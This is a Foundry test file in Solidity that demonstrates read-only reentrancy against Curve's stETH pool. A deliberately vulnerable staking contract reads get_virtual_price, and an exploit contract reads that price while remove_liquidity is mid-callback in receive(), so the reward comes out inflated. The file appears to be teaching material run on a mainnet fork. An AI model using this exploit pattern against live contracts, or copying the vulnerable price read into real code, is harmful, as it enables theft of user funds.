// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

// Video Reference - https://www.youtube.com/watch?v=0fgGTRlsDxI
// forge test --contracts ./src/test/ReadOnlyReentrancy.sol -vv

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidity(
        uint[2] calldata amounts,
        uint min_mint_amount
    ) external payable returns (uint);

    function remove_liquidity(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_liquidity_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// VulnContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract VulnContract {
    IERC20 public constant token = IERC20(LP_TOKEN);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function stake(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unstake(uint amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    function getReward() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return reward;
    }
}

contract ExploitContract {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    VulnContract private immutable target;

    constructor(address _target) {
        target = VulnContract(_target);
    }

    // Stake LP into VulnContract
    function stakeTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into VulnContract",
            pool.get_virtual_price()
        );

        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    // Perform Read-Only Reentrancy
    function performReadOnlyReentrnacy() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            pool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            pool.get_virtual_price()
        );

        // Attack - Log reward amount
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            pool.get_virtual_price()
        );
        // Attack - Log reward amount
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
    }
}

contract ExploitTest is Test {
    ExploitContract public hack;
    VulnContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new VulnContract(); // deploy the vulnerable contract
        hack = new ExploitContract(address(target)); // deploy attacker contract
    }

    function testPwn() public {
        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract
        hack.performReadOnlyReentrnacy{value: 100000 ether}();
    }
}
